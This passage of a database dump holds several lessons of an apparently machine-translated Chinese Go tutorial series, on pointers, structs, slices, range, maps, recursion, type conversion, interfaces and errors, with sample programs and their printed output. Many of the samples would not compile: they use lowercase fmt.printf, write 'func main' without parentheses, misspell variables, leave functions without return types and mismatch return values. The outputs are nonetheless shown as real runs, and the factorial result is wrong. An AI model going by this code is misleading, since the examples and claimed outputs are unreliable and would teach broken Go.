（a）定义一个指针变量（b）分配一个变量的指针；（c）在指针变量的地址，可用地址来访问它的值。这可通过使用一元运算符 * ，返回位于其操作数所指定的地址的变量的值。下面的例子利用这些操作：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main() {\r\n   var a int= 20   /* actual variable declaration */\r\n   var ip *int        /* pointer variable declaration */\r\n\r\n   ip = &amp;a  /* store address of a in pointer variable*/\r\n\r\n   fmt.Printf(\"Address of a variable: %x\\n\", &amp;a  )\r\n\r\n   /* address stored in pointer variable */\r\n   fmt.Printf(\"Address stored in ip variable: %x\\n\", ip )\r\n\r\n   /* access the value using the pointer */\r\n   fmt.Printf(\"Value of *ip variable: %d\\n\", *ip )\r\n}</code></pre>\r\n\r\n<p>当上述代码被编译和执行时，它会产生一些如下：</p>\r\n\r\n<pre>\r\nAddress of var variable: 10328000\r\nAddress stored in ip variable: 10328000\r\nValue of *ip variable: 20\r\n</pre>\r\n\r\n<p>在Go中的nil指针</p>\r\n\r\n<p>Go语言编译一个 nil 值赋给一个没有被确切的地址分配的指针变量。这样做是在变量声明时，分配 nil 指针被称为nil指针。</p>\r\n\r\n<p>nil指针是一个常数为零在几个标准库中定义的值。考虑下面的程序：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main() {\r\n   var  ptr *int\r\n\r\n   fmt.Printf(\"The value of ptr is : %x\\n\", ptr  )\r\n}</code></pre>\r\n\r\n<p>让我们编译和运行上面的程序，这将产生以下结果：</p>\r\n\r\n<pre>\r\nThe value of ptr is 0\r\n</pre>\r\n\r\n<p>在大多数操作系统中，程序不允许访问存储器的0地址，因为该存储器是由操作系统保留。然而，存储器地址0具有特别重要的意义;它表明，该指针不指向一个访问的存储器位置。不过，按照惯例，如果一个指针包含nil（零）的值，则假定它指向一个什么。</p>\r\n\r\n<p>要检查零（nil）指针，可以使用if语句如下：</p>\r\n\r\n<pre>\r\nif(ptr != nil)     /* succeeds if p is not nil */\r\nif(ptr == nil)    /* succeeds if p is null */\r\n</pre>\r\n\r\n<p>Go语言指针详情：</p>\r\n\r\n<p>指针有很多，但是很容易的概念，在Go编程中非常重要。有以下几个重要指针概念，作为一个Go程序员应该明确：</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:211px\">Concept</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">描述</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">Go -指针数组</td>\r\n			<td style=\"vertical-align:top\">可以定义数组持有一些指针</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">Go - 指针的指针</td>\r\n			<td style=\"vertical-align:top\">可以定义指针的指针</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">在Go中传递函数指针</td>\r\n			<td style=\"vertical-align:top\">通过引用或地址传递参数均使传递的参数将在调用函数被调用函数改变</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,'go语言系列教程14-指针',64,NULL,0),(44,0,'20150617094833',1,'<p>Go数组允许定义类型的变量，可容纳同类的多个数据项，但结构在Go编程，它允许结合不同种类的数据项，可使用其他用户定义的数据类型。</p>\r\n\r\n<p>结构是用来代表一个记录，假设要跟踪图书馆的图书。可能要跟踪有关每本书以下属性：</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>Title(书名)</p>\r\n	</li>\r\n	<li>\r\n	<p>Author(作者)</p>\r\n	</li>\r\n	<li>\r\n	<p>Subject(科目)</p>\r\n	</li>\r\n	<li>\r\n	<p>Book ID(编号)</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>定义结构</p>\r\n\r\n<p>定义一个结构，必须使用type和struct语句。该结构语句定义了一个新的数据类型，项目不止一个成员。类型语句是结构在我们的案例类型绑定的名称。该结构语句的格式是这样的：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">type struct_variable_type struct {\r\n   member definition;\r\n   member definition;\r\n   ...\r\n   member definition;\r\n}</code></pre>\r\n\r\n<p>一旦结构类型定义，它可以被用来声明使用以下语法类型的变量。</p>\r\n\r\n<pre>\r\nvariable_name := structure_variable_type {value1, value2...valuen}\r\n</pre>\r\n\r\n<p>访问结构成员</p>\r\n\r\n<p>要访问结构的成员，我们使用成员访问运算符(.)。成员访问运算符是编码作为结构变量名，并且我们希望访问结构部件之间的周期。可使用struct关键字来定义结构类型的变量。以下为例子来解释结构的用法：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\ntype Books struct {\r\n   title string\r\n   author string\r\n   subject string\r\n   book_id int\r\n}\r\n\r\nfunc main() {\r\n   var Book1 Books        /* Declare Book1 of type Book */\r\n   var Book2 Books        /* Declare Book2 of type Book */\r\n \r\n   /* book 1 specification */\r\n   Book1.title = \"Go Programming\"\r\n   Book1.author = \"Mahesh Kumar\"\r\n   Book1.subject = \"Go Programming Tutorial\"\r\n   Book1.book_id = 6495407\r\n\r\n   /* book 2 specification */\r\n   Book2.title = \"Telecom Billing\"\r\n   Book2.author = \"Zara Ali\"\r\n   Book2.subject = \"Telecom Billing Tutorial\"\r\n   Book2.book_id = 6495700\r\n \r\n   /* print Book1 info */\r\n   fmt.printf( \"Book 1 title : %s\\n\", Book1.title)\r\n   fmt.printf( \"Book 1 author : %s\\n\", Book1.author)\r\n   fmt.printf( \"Book 1 subject : %s\\n\", Book1.subject)\r\n   fmt.printf( \"Book 1 book_id : %d\\n\", Book1.book_id)\r\n\r\n   /* print Book2 info */\r\n   fmt.printf( \"Book 2 title : %s\\n\", Book2.title)\r\n   fmt.printf( \"Book 2 author : %s\\n\", Book2.author)\r\n   fmt.printf( \"Book 2 subject : %s\\n\", Book2.subject)\r\n   fmt.printf( \"Book 2 book_id : %d\\n\", Book2.book_id)\r\n}</code></pre>\r\n\r\n<p>当上述代码被编译和执行时，它产生了以下结果：</p>\r\n\r\n<pre>\r\nBook 1 title : Go Programming\r\nBook 1 author : Mahesh Kumar\r\nBook 1 subject : Go Programming Tutorial\r\nBook 1 book_id : 6495407\r\nBook 2 title : Telecom Billing\r\nBook 2 author : Zara Ali\r\nBook 2 subject : Telecom Billing Tutorial\r\nBook 2 book_id : 6495700\r\n</pre>\r\n\r\n<p>结构作为函数参数</p>\r\n\r\n<p>可以传递一个结构作为函数的参数，非常类似传递任何其他变量或指针的方式。您可以访问，就象在上面的例子已经访问的方式类似的结构变量：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\ntype Books struct {\r\n   title string\r\n   author string\r\n   subject string\r\n   book_id int\r\n}\r\n\r\nfunc main() {\r\n   var Book1 Books        /* Declare Book1 of type Book */\r\n   var Book2 Books        /* Declare Book2 of type Book */\r\n \r\n   /* book 1 specification */\r\n   Book1.title = \"Go Programming\"\r\n   Book1.author = \"Mahesh Kumar\"\r\n   Book1.subject = \"Go Programming Tutorial\"\r\n   Book1.book_id = 6495407\r\n\r\n   /* book 2 specification */\r\n   Book2.title = \"Telecom Billing\"\r\n   Book2.author = \"Zara Ali\"\r\n   Book2.subject = \"Telecom Billing Tutorial\"\r\n   Book2.book_id = 6495700\r\n \r\n   /* print Book1 info */\r\n   printBook(Book1)\r\n\r\n   /* print Book2 info */\r\n   printBook(Book2)\r\n}\r\nfunc printBook( book Books )\r\n{\r\n   fmt.printf( \"Book title : %s\\n\", book.title);\r\n   fmt.printf( \"Book author : %s\\n\", book.author);\r\n   fmt.printf( \"Book subject : %s\\n\", book.subject);\r\n   fmt.printf( \"Book book_id : %d\\n\", book.book_id);\r\n}</code></pre>\r\n\r\n<p>当上述代码被编译和执行时，它产生了以下结果：</p>\r\n\r\n<pre>\r\nBook title : Go Programming\r\nBook author : Mahesh Kumar\r\nBook subject : Go Programming Tutorial\r\nBook book_id : 6495407\r\nBook title : Telecom Billing\r\nBook author : Zara Ali\r\nBook subject : Telecom Billing Tutorial\r\nBook book_id : 6495700\r\n</pre>\r\n\r\n<p>指针结构</p>\r\n\r\n<p>可以非常相似定义指针结构的方式，为您定义指向任何其他变量，如下所示：</p>\r\n\r\n<pre>\r\nvar struct_pointer *Books\r\n</pre>\r\n\r\n<p>现在，你可以存储结构变量的地址在上面定义的指针变量。为了找到一个结构变量的地址，使用&amp;运算符结构在名字前，如下所示：</p>\r\n\r\n<pre>\r\nstruct_pointer = &amp;Book1;\r\n</pre>\r\n\r\n<p>要访问结构的使用指针成员的结构，您必须使用&ldquo;.&rdquo;运算符，如下：</p>\r\n\r\n<pre>\r\nstruct_pointer.title;\r\n</pre>\r\n\r\n<p>让我们使用结构指针重新写上面的例子，希望这可以帮助您理解概念：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\ntype Books struct {\r\n   title string\r\n   author string\r\n   subject string\r\n   book_id int\r\n}\r\n\r\nfunc main() {\r\n   var Book1 Books        /* Declare Book1 of type Book */\r\n   var Book2 Books        /* Declare Book2 of type Book */\r\n \r\n   /* book 1 specification */\r\n   Book1.title = \"Go Programming\"\r\n   Book1.author = \"Mahesh Kumar\"\r\n   Book1.subject = \"Go Programming Tutorial\"\r\n   Book1.book_id = 6495407\r\n\r\n   /* book 2 specification */\r\n   Book2.title = \"Telecom Billing\"\r\n   Book2.author = \"Zara Ali\"\r\n   Book2.subject = \"Telecom Billing Tutorial\"\r\n   Book2.book_id = 6495700\r\n \r\n   /* print Book1 info */\r\n   printBook(&amp;Book1)\r\n\r\n   /* print Book2 info */\r\n   printBook(&amp;Book2)\r\n}\r\nfunc printBook( book *Books )\r\n{\r\n   fmt.printf( \"Book title : %s\\n\", book.title);\r\n   fmt.printf( \"Book author : %s\\n\", book.author);\r\n   fmt.printf( \"Book subject : %s\\n\", book.subject);\r\n   fmt.printf( \"Book book_id : %d\\n\", book.book_id);\r\n}</code></pre>\r\n\r\n<p>当上述代码被编译和执行时，它产生了以下结果：</p>\r\n\r\n<pre>\r\nBook title : Go Programming\r\nBook author : Mahesh Kumar\r\nBook subject : Go Programming Tutorial\r\nBook book_id : 6495407\r\nBook title : Telecom Billing\r\nBook author : Zara Ali\r\nBook subject : Telecom Billing Tutorial\r\nBook book_id : 6495700</pre>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,'go语言系列教程15-结构',66,NULL,0),(45,0,'20150617095032',1,'<p>Go编程切片是一种抽象了Go编程数组。由于Go编程数组允许您定义的变量，可容纳同类的几个数据项类型，但它不提供任何内置的方法来动态地增加它的大小或得到一个子数组自身。切片覆盖这一限制。它提供了数组所需的多种效用函数，被广泛应用在Go编程。</p>\r\n\r\n<p>定义切片</p>\r\n\r\n<p>要定义一个切片，你可以声明它作为一个数组时，不需要指定大小或使用make函数来创建。</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">var numbers []int /* a slice of unspecified size */\r\n/* numbers == []int{0,0,0,0,0}*/\r\nnumbers = make([]int,5,5) /* a slice of length 5 and capacity 5*/</code></pre>\r\n\r\n<p>len() 和 cap() 函数</p>\r\n\r\n<p>由于切片是一种抽象数组。它实际上使用数组作为底层structure.len()函数返回的元素呈现在cap()函数返回切片作为多少元素，它可以容纳的容量的切片。以下为例子来解释片的使用：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main {\r\n   var numbers = make([]int,3,5)\r\n   \r\n   printSlice(numbers)\r\n}\r\n\r\nfunc printSlice(x []int){\r\n   fmt.printf(\"len=%d cap=%d slice=%v\\n\",len(x),cap(x),x)\r\n}</code></pre>\r\n\r\n<p>当上述代码被编译和执行时，它产生了以下结果：</p>\r\n\r\n<pre>\r\nlen=3 cap=5 slice=[0 0 0]\r\n</pre>\r\n\r\n<p>Nil 切片</p>\r\n\r\n<p>如果一个切片，没有输入默认声明，它被初始化为为nil。其长度和容量都为零。下面是一个例子：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main {\r\n   var numbers []int\r\n   \r\n   printSlice(numbers)\r\n   \r\n   if(numbers == nil){\r\n      fmt.printf(\"slice is nil\")\r\n   }\r\n}\r\n\r\nfunc printSlice(x []int){\r\n   fmt.printf(\"len=%d cap=%d slice=%v\\n\",len(x),cap(x),x)\r\n}</code></pre>\r\n\r\n<p>当上述代码被编译和执行时，它产生了以下结果：</p>\r\n\r\n<pre>\r\nlen=0 cap=0 slice=[]\r\nslice is nil\r\n</pre>\r\n\r\n<p>子切片</p>\r\n\r\n<p>切片允许设置下限和上限进行指定，以得到它使用的子片[下限：上限]。下面是一个例子：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main {\r\n   /* create a slice */\r\n   numbers := []int{0,1,2,3,4,5,6,7,8}   \r\n   printSlice(numbers)\r\n   \r\n   /* print the original slice */\r\n   fmt.Println(\"numbers ==\", numbers)\r\n   \r\n   /* print the sub slice starting from index 1(included) to index 4(excluded)*/\r\n   fmt.Println(\"numbers[1:4] ==\", numbers[1:4])\r\n   \r\n   /* missing lower bound implies 0*/\r\n   fmt.Println(\"numbers[:3] ==\", numbers[:3])\r\n   \r\n   /* missing upper bound implies len(s)*/\r\n   fmt.Println(\"numbers[4:] ==\", numbers[4:])\r\n   \r\n   numbers1 := make([]int,0,5)\r\n   printSlice(numbers1)\r\n   \r\n   /* print the sub slice starting from index 0(included) to index 2(excluded) */\r\n   number2 := numbers[:2]\r\n   printSlice(number2)\r\n   \r\n   /* print the sub slice starting from index 2(included) to index 5(excluded) */\r\n   number3 := numbers[2:5]\r\n   printSlice(number3)\r\n   \r\n}\r\n\r\nfunc printSlice(x []int){\r\n   fmt.printf(\"len=%d cap=%d slice=%v\\n\",len(x),cap(x),x)\r\n}</code></pre>\r\n\r\n<p>当上述代码被编译和执行时，它产生了以下结果：</p>\r\n\r\n<pre>\r\nlen=9 cap=9 slice=[0 1 2 3 4 5 6 7 8]\r\nnumbers == [0 1 2 3 4 5 6 7 8]\r\nnumbers[1:4] == [1 2 3]\r\nnumbers[:3] == [0 1 2]\r\nnumbers[4:] == [4 5 6 7 8]\r\nlen=0 cap=5 slice=[]\r\nlen=2 cap=9 slice=[0 1]\r\nlen=3 cap=7 slice=[2 3 4]\r\n</pre>\r\n\r\n<p>append() 和 copy() 函数</p>\r\n\r\n<p>Slice允许增加使用切片的append()函数。使用copy()函数，源切片的内容复制到目标切片。下面是一个例子：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main {\r\n   var numbers []int\r\n   printSlice(numbers)\r\n   \r\n   /* append allows nil slice */\r\n   numbers = append(numbers, 0)\r\n   printSlice(numbers)\r\n   \r\n   /* add one element to slice*/\r\n   numbers = append(numbers, 1)\r\n   printSlice(numbers)\r\n   \r\n   /* add more than one element at a time*/\r\n   numbers = append(numbers, 2,3,4)\r\n   printSlice(numbers)\r\n   \r\n   /* create a slice numbers1 with double the capacity of earlier slice*/\r\n   numbers1 := make([]int, len(numbers), (cap(numbers))*2)\r\n   \r\n   /* copy content of numbers to numbers1 */\r\n   copy(numbers1,numbers)\r\n   printSlice(numbers1)   \r\n}\r\n\r\nfunc printSlice(x []int){\r\n   fmt.printf(\"len=%d cap=%d slice=%v\\n\",len(x),cap(x),x)\r\n}</code></pre>\r\n\r\n<p>当上述代码被编译和执行时，它产生了以下结果：</p>\r\n\r\n<pre>\r\nlen=0 cap=0 slice=[]\r\nlen=1 cap=2 slice=[0]\r\nlen=2 cap=2 slice=[0 1]\r\nlen=5 cap=8 slice=[0 1 2 3 4]\r\nlen=5 cap=16 slice=[0 1 2 3 4]</pre>\r\n',0,0,'go语言系列教程16-切片',71,NULL,0),(46,0,'20150617095218',1,'<p>range关键字用于循环遍历数组，切片，管道或映射项目。数组和切片，它返回项目作为整数的索引。映射返回下一个键 - 值对的键。无论是范围返回一个或两个值。如果只有一个值被用于在一系列表达式的左侧，它是下表中的第一值。</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">范围表达式</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">第一个值</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">第二个值(Optional)</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">数组或切片 a [n]E</td>\r\n			<td style=\"vertical-align:top\">index i int</td>\r\n			<td style=\"vertical-align:top\">a[i] E</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">String s 字符串类型</td>\r\n			<td style=\"vertical-align:top\">index i int</td>\r\n			<td style=\"vertical-align:top\">rune int</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">map m map[K]V</td>\r\n			<td style=\"vertical-align:top\">key k K</td>\r\n			<td style=\"vertical-align:top\">value m[k] V</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">channel c chan E</td>\r\n			<td style=\"vertical-align:top\">element e E</td>\r\n			<td style=\"vertical-align:top\">none</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>例子</p>\r\n\r\n<p>下面是一个例子：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main {\r\n   /* create a slice */\r\n   numbers := []int{0,1,2,3,4,5,6,7,8} \r\n   \r\n   /* print the numbers */\r\n   for i:= range numbers {\r\n      fmt.Println(\"Slice item\",i,\"is\",numbers[i])\r\n   }\r\n   \r\n   /* create a map*/\r\n   coutryCapitalMap := map[string] string {\"France\":\"Paris\",\"Italy\":\"Rome\",\"Japan\":\"Tokyo\"}\r\n   \r\n   /* print map using keys*/\r\n   for country := range countryCapitalMap {\r\n      fmt.Println(\"Capital of\",country,\"is\",countryCapitalMap[country])\r\n   }\r\n   \r\n   /* print map using key-value*/\r\n   for country,capital := range countryCapitalMap {\r\n      fmt.Println(\"Capital of\",country,\"is\",capital)\r\n   }\r\n}</code></pre>\r\n\r\n<p>当上述代码被编译和执行时，它产生了以下结果：</p>\r\n\r\n<pre>\r\nSlice item 0 is 0\r\nSlice item 1 is 1\r\nSlice item 2 is 2\r\nSlice item 3 is 3\r\nSlice item 4 is 4\r\nSlice item 5 is 5\r\nSlice item 6 is 6\r\nSlice item 7 is 7\r\nSlice item 8 is 8\r\nCapital of France is Paris\r\nCapital of Italy is Rome\r\nCapital of Japan is Tokyo\r\nCapital of France is Paris\r\nCapital of Italy is Rome\r\nCapital of Japan is Tokyo</pre>\r\n',0,0,'go语言系列教程17-范围',102,NULL,0),(47,0,'20150617095346',1,'<p>Go编程提供另一个重要的数据类型是映射，唯一映射一个键到一个值。一个键要使用在以后检索值的对象。给定的键和值，可以在一个Map对象存储的值。值存储后，您可以使用它的键检索。</p>\r\n\r\n<p>定义映射</p>\r\n\r\n<p>必须使用make函数来创建一个映射。</p>\r\n\r\n<pre>\r\n/* declare a variable, by default map will be nil*/\r\nvar map_variable map[key_data_type]value_data_type\r\n\r\n/* define the map as nil map can not be assigned any value*/\r\nmap_variable = make(map[key_data_type]value_data_type)\r\n</pre>\r\n\r\n<p>例子</p>\r\n\r\n<p>下面的例子说明创建和映射的使用。</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main {\r\n   var coutryCapitalMap map[string]string\r\n   /* create a map*/\r\n   coutryCapitalMap = make(map[string]string)\r\n   \r\n   /* insert key-value pairs in the map*/\r\n   countryCapitalMap[\"France\"] = \"Paris\"\r\n   countryCapitalMap[\"Italy\"] = \"Rome\"\r\n   countryCapitalMap[\"Japan\"] = \"Tokyo\"\r\n   countryCapitalMap[\"India\"] = \"New Delhi\"\r\n   \r\n   /* print map using keys*/\r\n   for country := range countryCapitalMap {\r\n      fmt.Println(\"Capital of\",country,\"is\",countryCapitalMap[country])\r\n   }\r\n   \r\n   /* test if entry is present in the map or not*/\r\n   captial, ok := countryCapitalMap[\"United States\"]\r\n   /* if ok is true, entry is present otherwise entry is absent*/\r\n   if(ok){\r\n      fmt.Println(\"Capital of United States is\", capital)  \r\n   }else {\r\n      fmt.Println(\"Capital of United States is not present\") \r\n   }\r\n}</code></pre>\r\n\r\n<p>让我们编译和运行上面的程序，这将产生以下结果：</p>\r\n\r\n<pre>\r\nCapital of India is New Delhi\r\nCapital of France is Paris\r\nCapital of Italy is Rome\r\nCapital of Japan is Tokyo\r\nCapital of United States is not present\r\n</pre>\r\n\r\n<p>delete() 函数</p>\r\n\r\n<p>delete()函数是用于从映射中删除一个项目。映射和相应的键将被删除。下面是一个例子：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main {   \r\n   /* create a map*/\r\n   coutryCapitalMap := map[string] string {\"France\":\"Paris\",\"Italy\":\"Rome\",\"Japan\":\"Tokyo\",\"India\":\"New Delhi\"}\r\n   \r\n   fmt.Println(\"Original map\")   \r\n   \r\n   /* print map */\r\n   for country := range countryCapitalMap {\r\n      fmt.Println(\"Capital of\",country,\"is\",countryCapitalMap[country])\r\n   }\r\n   \r\n   /* delete an entry */\r\n   delete(countryCapitalMap,\"France\");\r\n   fmt.Println(\"Entry for France is deleted\")  \r\n   \r\n   fmt.Println(\"Updated map\")   \r\n   \r\n   /* print map */\r\n   for country := range countryCapitalMap {\r\n      fmt.Println(\"Capital of\",country,\"is\",countryCapitalMap[country])\r\n   }\r\n}</code></pre>\r\n\r\n<p>让我们编译和运行上面的程序，这将产生以下结果：</p>\r\n\r\n<pre>\r\nOriginal Map\r\nCapital of France is Paris\r\nCapital of Italy is Rome\r\nCapital of Japan is Tokyo\r\nCapital of India is New Delhi\r\nEntry for France is deleted\r\nUpdated Map\r\nCapital of India is New Delhi\r\nCapital of Italy is Rome\r\nCapital of Japan is Tokyo</pre>\r\n',0,0,'go语言系列教程18-映射',63,NULL,0),(48,0,'20150617095507',1,'<p>递归是以相似的方式重复项目的过程。同样适用于编程语言中，如果一个程序可以让你调用同一个函数被调用的函数，递归调用函数内使用如下。</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">func recursion() {\r\n   recursion() /* function calls itself */\r\n}\r\n\r\nfunc main() {\r\n   recursion()\r\n}</code></pre>\r\n\r\n<p>Go编程语言支持递归，即要调用的函数本身。但是在使用递归时，程序员需要谨慎确定函数的退出条件，否则会造成无限循环。</p>\r\n\r\n<p>递归函数是解决许多数学问题想计算一个数阶乘非常有用的，产生斐波系列等</p>\r\n\r\n<p>数字阶乘</p>\r\n\r\n<p>以下是一个例子，它计算阶乘用于使用一个递归函数由给定数：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc factorial(i int) {\r\n   if(i &lt;= 1) {\r\n      return 1\r\n   }\r\n   return i * factorial(i - 1)\r\n}\r\n\r\nfunc main {  \r\n    var i int = 15\r\n    fmt.Printf(\"Factorial of %d is %d\\n\", i, factorial(i))\r\n}</code></pre>\r\n\r\n<p>让我们编译和运行上面的程序，这将产生以下结果：</p>\r\n\r\n<pre>\r\nFactorial of 15 is 2004310016\r\n</pre>\r\n\r\n<p>斐波那契系列</p>\r\n\r\n<p>以下是另一个例子，其产生斐波串联使用一个递归函数由给定一个数：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc fibonaci(i int) {\r\n   if(i == 0) {\r\n      return 0\r\n   }\r\n   if(i == 1) {\r\n      return 1\r\n   }\r\n   return fibonaci(i-1) + fibonaci(i-2)\r\n}\r\n\r\nfunc main() {\r\n    var i int\r\n    for i = 0; i &lt; 10; i++ {\r\n       fmt.Printf(\"%d\\t%n\", fibonaci(i))\r\n    }    \r\n}</code></pre>\r\n\r\n<p>让我们编译和运行上面的程序，这将产生以下结果：</p>\r\n\r\n<pre>\r\n0	1	1	2	3	5	8	13	21	34</pre>\r\n',0,0,'go语言系列教程19-递归',75,NULL,0),(49,0,'20150617095628',1,'<p>类型转换是一种可变从一种数据类型转换成另一种数据类型。例如，如果要存储一个long值转成一个简单的整数，那么可以强制类型转换long为int。可以从一种类型使用转换运算符将原类型值转换为另一种类型值，如下：</p>\r\n\r\n<pre>\r\ntype_name(expression)\r\n</pre>\r\n\r\n<p>例子</p>\r\n\r\n<p>请看下面的例子中，产生浮点数运算执行一个整型变量除以另一个数的转换。</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main() {\r\n   var sum int = 17\r\n   var count int = 5\r\n   var mean float32\r\n   \r\n   maen = float32(sum)/float32(count)\r\n   fmt.Printf(\"Value of mean : %f\\n\",mean)\r\n}</code></pre>\r\n\r\n<p>让我们编译和运行上面的程序，这将产生以下结果：</p>\r\n\r\n<pre>\r\nValue of mean : 3.400000</pre>\r\n',0,0,'go语言系列教程20-类型转换',77,NULL,0),(50,0,'20150617095813',1,'<p>Go编程提供所谓的接口是另一种数据类型，代表了一组方法签名。结构数据类型实现这些接口对接口的方法签名，并其实现方法具体定义。</p>\r\n\r\n<p>Syntax</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">/* define an interface */\r\ntype interface_name interface {\r\n   method_name1 [return_type]\r\n   method_name2 [return_type]\r\n   method_name3 [return_type]\r\n   ...\r\n   method_namen [return_type]\r\n}\r\n\r\n/* define a struct */\r\ntype struct_name struct {\r\n   /* variables */\r\n}\r\n\r\n/* implement interface methods*/\r\nfunc (struct_name_variable struct_name) method_name1() [return_type] {\r\n   /* method implementation */\r\n}\r\n...\r\nfunc (struct_name_variable struct_name) method_namen() [return_type] {\r\n   /* method implementation */\r\n}</code></pre>\r\n\r\n<p>例子</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport (\r\n   \"fmt\"\r\n   \"math\"\r\n)\r\n\r\n/* define an interface */\r\ntype Shape interface {\r\n   area() float64\r\n}\r\n\r\n/* define a circle */\r\ntype Circle struct {\r\n   x,y,radius float64\r\n}\r\n\r\n/* define a rectangle */\r\ntype Rectangle struct {\r\n   width, height float64\r\n}\r\n\r\n/* define a method for circle (implementation of Shape.area())*/\r\nfunc(circle Circle) area() float64 {\r\n   return math.Pi * circle.radius * circle.radius\r\n}\r\n\r\n/* define a method for rectangle (implementation of Shape.area())*/\r\nfunc(rect Rectangle) area() float64 {\r\n   return rect.width * rect.height\r\n}\r\n\r\n/* define a method for shape */\r\nfunc getArea(shape Shape) float64 {\r\n   return shape.area()\r\n}\r\n\r\nfunc main() {\r\n   circle := Circle{x:0,y:0,radius:5}\r\n   rectangle := Rectangle {width:10, height:5}\r\n   \r\n   fmt.Printf(\"Circle area: %f\\n\",getArea(circle))\r\n   fmt.Printf(\"Rectangle area: %f\\n\",getArea(rectangle))\r\n}</code></pre>\r\n\r\n<p>让我们编译和运行上面的程序，这将产生以下结果：</p>\r\n\r\n<pre>\r\nCircle area: 78.539816\r\nRectangle area: 50.000000</pre>\r\n',0,0,'go语言系列教程21-接口',64,NULL,0),(51,0,'20150617095930',1,'<p>Go编程提供了一个非常简单的错误处理框架，下面的声明中内置错误接口类型：</p>\r\n\r\n<pre>\r\ntype error interface {\r\n   Error() string\r\n}\r\n</pre>\r\n\r\n<p>函数正常返回的错误作为最后返回值。使用errors.New构建一个基本的错误信息如下：</p>\r\n\r\n<pre>\r\nfunc Sqrt(value float64)(float64, error) {\r\n   if(value &lt; 0){\r\n      return 0, errors.New(&quot;Math: negative number passed to Sqrt&quot;)\r\n   }\r\n   return math.Sqrt(value)\r\n}\r\n</pre>\r\n\r\n<p>使用返回值和错误消息。</p>\r\n\r\n<pre>\r\nresult, err:= Sqrt(-1)\r\n\r\nif err != nil {\r\n   fmt.Println(err)\r\n}\r\n</pre>\r\n\r\n<p>例子</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"errors\"\r\nimport \"fmt\"\r\nimport \"math\"\r\n\r\nfunc Sqrt(value float64)(float64, error) {\r\n   if(value &lt; 0){\r\n      return 0, errors.New(\"Math: negative number passed to Sqrt\")\r\n   }\r\n   return math.Sqrt(value)\r\n}\r\n\r\nfunc main() {\r\n   result, err:= Sqrt(-1)\r\n\r\n   if err != nil {\r\n      fmt.Println(err)\r\n   }else {\r\n      fmt.Println(result)\r\n   }\r\n   \r\n   result, err = Sqrt(9)\r\n\r\n   if err != nil {\r\n      fmt.Println(err)\r\n   }else {\r\n      